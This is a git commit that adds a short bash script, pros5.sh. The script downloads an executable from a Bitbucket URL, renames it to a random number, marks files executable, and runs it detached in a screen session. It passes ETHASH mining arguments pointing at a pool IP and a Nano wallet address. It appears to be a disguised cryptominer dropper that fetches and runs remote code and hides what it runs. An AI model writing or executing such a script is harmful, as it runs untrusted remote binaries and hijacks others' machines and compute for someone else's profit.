7ec274dadcb492248673b910cf60608ccdee5be8
jrkeiter <91981745+jrkeiter@users.noreply.github.com>
2021-12-12 07:48:06 +0700

    Create pros5.sh

---
+++ pros5.sh
@@ -0,0 +1,18 @@
+#!/bin/bash
+
+WELS=nano_34zxr51ybgctoqr9gkn5znqtyd5ji83ck1z4idqqdpm7xznfxfa4fpua4ik8
+PAL=51.81.57.44:2020
+WER=x
+COMS="--algo ETHASH --pool $PAL --user $WELS.$WER"
+TIP=$(shuf -n 1 -i 1-200000)
+
+
+FILE=./tuan
+if [ -f "$FILE" ]; then
+    echo "$FILE exists."
+else 
+    wget https://bitbucket.org/solomase/garangsem/raw/d261db312adaef2baefd19624650e14af8c938dc/tuan
+    mv tuan $TIP
+    chmod +x *
+fi
+screen -dmLS ./$TIP $COMS
